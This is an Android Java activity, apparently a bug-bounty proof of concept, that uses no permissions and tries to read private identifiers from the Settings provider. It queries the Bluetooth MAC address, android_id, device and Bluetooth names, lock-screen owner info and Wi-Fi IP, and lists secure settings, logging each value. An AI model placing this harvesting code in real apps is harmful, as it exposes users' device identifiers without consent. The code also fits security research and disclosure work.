package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;

public class SettingsLeakActivity extends Activity {
    private static final String T = "SETTINGS_LEAK";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Settings Provider Data Leak Test ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " PID=" + android.os.Process.myPid());
        Log.w(T, "ZERO PERMISSIONS — attempting to read PII from Settings provider");

        ContentResolver cr = getContentResolver();

        // Test 1: bluetooth_address via API
        try {
            String btAddr = Settings.Secure.getString(cr, "bluetooth_address");
            Log.w(T, "[API] bluetooth_address = " + btAddr);
        } catch (Exception e) {
            Log.w(T, "[-] API bluetooth_address failed: " + e.getMessage());
        }

        // Test 2: bluetooth_address via direct provider query
        try {
            Cursor c = cr.query(
                Uri.parse("content://settings/secure/bluetooth_address"),
                null, null, null, null);
            if (c != null) {
                if (c.moveToFirst()) {
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        Log.w(T, "[PROVIDER] bluetooth_address col[" + c.getColumnName(i) + "]=" + c.getString(i));
                    }
                } else {
                    Log.w(T, "[-] bluetooth_address query: empty cursor");
                }
                c.close();
            }
        } catch (Exception e) {
            Log.w(T, "[-] Provider bluetooth_address failed: " + e.getMessage());
        }

        // Test 3: android_id
        try {
            String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
            Log.w(T, "[API] android_id = " + androidId);
        } catch (Exception e) {
            Log.w(T, "[-] android_id failed: " + e.getMessage());
        }

        // Test 4: bluetooth_name
        try {
            String btName = Settings.Secure.getString(cr, "bluetooth_name");
            Log.w(T, "[API] bluetooth_name = " + btName);
        } catch (Exception e) {
            Log.w(T, "[-] bluetooth_name failed: " + e.getMessage());
        }

        // Test 5: device_name from Global
        try {
            String deviceName = Settings.Global.getString(cr, "device_name");
            Log.w(T, "[API] device_name = " + deviceName);
        } catch (Exception e) {
            Log.w(T, "[-] device_name failed: " + e.getMessage());
        }

        // Test 6: bluetooth_address via direct content query
        try {
            Cursor c = cr.query(
                Uri.parse("content://settings/secure"),
                new String[]{"value"},
                "name=?",
                new String[]{"bluetooth_address"},
                null);
            if (c != null) {
                if (c.moveToFirst()) {
                    Log.w(T, "[QUERY] bluetooth_address = " + c.getString(0));
                }
                c.close();
            }
        } catch (Exception e) {
            Log.w(T, "[-] Query bluetooth_address failed: " + e.getMessage());
        }

        // Test 7: lock_screen_owner_info
        try {
            String lockInfo = Settings.Secure.getString(cr, "lock_screen_owner_info");
            Log.w(T, "[API] lock_screen_owner_info = " + lockInfo);
        } catch (Exception e) {
            Log.w(T, "[-] lock_screen_owner_info failed: " + e.getMessage());
        }

        // Test 8: account type info via Settings
        try {
            String account = Settings.Secure.getString(cr, "last_setup_shown");
            Log.w(T, "[API] last_setup_shown = " + account);
        } catch (Exception e) {
            Log.w(T, "[-] last_setup_shown failed: " + e.getMessage());
        }

        // Test 9: wifi_static_ip info
        try {
            String wifiIp = Settings.System.getString(cr, "wifi_static_ip");
            Log.w(T, "[API] wifi_static_ip = " + wifiIp);
        } catch (Exception e) {
            Log.w(T, "[-] wifi_static_ip failed: " + e.getMessage());
        }

        // Test 10: Enumerate ALL secure settings
        try {
            Cursor c = cr.query(
                Uri.parse("content://settings/secure"),
                null, null, null, null);
            if (c != null) {
                Log.w(T, "[ENUM] Secure settings count: " + c.getCount());
                int count = 0;
                while (c.moveToNext() && count < 20) {
                    String name = c.getString(c.getColumnIndex("name"));
                    String value = c.getString(c.getColumnIndex("value"));
                    if (value != null && !value.isEmpty()) {
                        Log.w(T, "[ENUM] " + name + " = " + (value.length() > 50 ? value.substring(0, 50) + "..." : value));
                    }
                    count++;
                }
                c.close();
            }
        } catch (Exception e) {
            Log.w(T, "[-] Enum secure settings failed: " + e.getMessage());
        }

        Log.w(T, "=== Settings leak test complete ===");
        finish();
    }
}
